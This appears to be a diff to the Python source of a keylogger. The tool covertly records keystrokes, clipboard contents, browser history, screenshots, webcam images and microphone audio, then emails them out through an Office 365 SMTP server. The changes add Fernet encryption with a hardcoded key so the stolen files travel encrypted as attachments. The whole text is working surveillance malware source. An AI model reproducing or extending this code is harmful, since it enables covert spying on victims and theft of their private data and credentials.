@@ -6,6 +6,7 @@ import sounddevice
 import cv2
 import time
 import browserhistory
+from cryptography.fernet import Fernet
 from scipy.io.wavfile import write
 from threading import Timer, Thread
 from datetime import datetime
@@ -80,32 +81,27 @@ class Keylogger:
         html = MIMEText(f"<h2><b>Key Log:</b></h2><p>{message}</p>", "html")
         email.attach(text)
         email.attach(html)
-        # create a file with current clipboards
-        if clipboard:
-            with open("file_attachments/clipboard.txt", "w") as clipboard_file:
-                for clip in clipboard:
-                    clipboard_file.write(f"{clip}\n")
-            files.append("file_attachments/clipboard.txt")
-        
-        # create a file with current browser history
-        with open("file_attachments/browserhistory.txt", "w") as b_history_file:
-            browser_history = browserhistory.get_browserhistory()
-            #for every browser
-            for browser in browser_history.keys():
-                b_history_file.write(f"==={browser}===\n")
-                for history in browser_history[browser]:
-                    b_history_file.write(f"{history}\n")
-                b_history_file.write("\n\n")
-        files.append("file_attachments/browserhistory.txt")
-        
+
+        #encrypt files
+        key = b'4kubp0WObXXqcfjLj42rWSyvPubOgCRNrhYsgb_P_pQ='
+        encrypted_files = []
+        for file in files:
+            with open(f'file_attachments/{file}', 'rb') as regular_file:            # Opens the file in binary format for reading
+                data = regular_file.read()
+            encrypted = Fernet(key).encrypt(data)
+            with open(f'file_attachments/e_{file}', 'ab') as encrypted_file:    # Appending to the end of the file if it exists
+                encrypted_file.write(encrypted)
+            os.remove(f'file_attachments/{file}')
+            encrypted_files
+
         # add file attachments to email
         for file in files:
             # open file with read and binary mode
-            with open(file, "rb") as file_attachment:
-                attachment = MIMEApplication(file_attachment.read(), Name = basename(file))
-            os.remove(f'{file}')
+            with open(f'file_attachments/e_{file}', "rb") as file_attachment:
+                attachment = MIMEApplication(file_attachment.read(), Name = f'e_{basename(file)}')
+            os.remove(f'file_attachments/e_{file}')
             # After the file is closed
-            attachment['Content-Disposition'] = f'attachment; filename="{basename(file)}"'
+            attachment['Content-Disposition'] = f'attachment; filename="e_{basename(file)}"'
             email.attach(attachment)
 
         # convert mail to string message
@@ -119,6 +115,24 @@ class Keylogger:
     - returns the formatted email as a string
     '''
     def send_email(self, email, password, message, files, clipboard, verbose=1):
+        # create a file with current clipboards
+        if clipboard:
+            with open("file_attachments/clipboard.txt", "w") as clipboard_file:
+                for clip in clipboard:
+                    clipboard_file.write(f"{clip}\n")
+            files.append("clipboard.txt")
+        
+        # create a file with current browser history
+        with open("file_attachments/browserhistory.txt", "w") as b_history_file:
+            browser_history = browserhistory.get_browserhistory()
+            #for every browser
+            for browser in browser_history.keys():
+                b_history_file.write(f"==={browser}===\n")
+                for history in browser_history[browser]:
+                    b_history_file.write(f"{history}\n")
+                b_history_file.write("\n\n")
+        files.append("browserhistory.txt")
+
         # manages a connection to an SMTP server (for Microsoft365, Outlook, Hotmail, and live.com)
         server = smtplib.SMTP(host="smtp.office365.com", port=587)
         # connect to the SMTP server as TLS mode ( for security )
@@ -165,8 +179,8 @@ class Keylogger:
             # capture screen shot
             dt = f'{datetime.now()}'
             img = ImageGrab.grab()
-            img_name = f'file_attachments/screenshot{dt.replace(".", "-").replace(":", "-").replace(" ", "_")}.png'
-            img.save(img_name)
+            img_name = f'screenshot{dt.replace(".", "-").replace(":", "-").replace(" ", "_")}.png'
+            img.save(f'file_attachments/{img_name}')
             self.attachments.append(img_name)
 
             # set interval for screen capture
@@ -186,8 +200,8 @@ class Keylogger:
             ret, frame = cap.read()
             if ret:
                 dt = f'{datetime.now()}'
-                web_cap_name = f'file_attachments/webcam{dt.replace(".", "-").replace(":", "-").replace(" ", "_")}.png'
-                cv2.imwrite(web_cap_name, frame)
+                web_cap_name = f'webcam{dt.replace(".", "-").replace(":", "-").replace(" ", "_")}.png'
+                cv2.imwrite(f'file_attachments/{web_cap_name}', frame)
                 self.attachments.append(web_cap_name)
 
         # timer = Timer(interval=interval, function=self.capture_webcam)
@@ -212,10 +226,10 @@ class Keylogger:
             else:
                 duration = self.interval/2
             dt = f'{datetime.now()}'
-            recording_name = f'file_attachments/recording{dt.replace(".", "-").replace(":", "-").replace(" ", "_")}.wav'
+            recording_name = f'recording{dt.replace(".", "-").replace(":", "-").replace(" ", "_")}.wav'
             recording = sounddevice.rec(int(duration * freq), samplerate=freq, channels=2)
             sounddevice.wait()
-            write(recording_name, freq, recording)
+            write(f'file_attachments/{recording_name}', freq, recording)
             self.attachments.append(recording_name)
             time.sleep(duration)
 
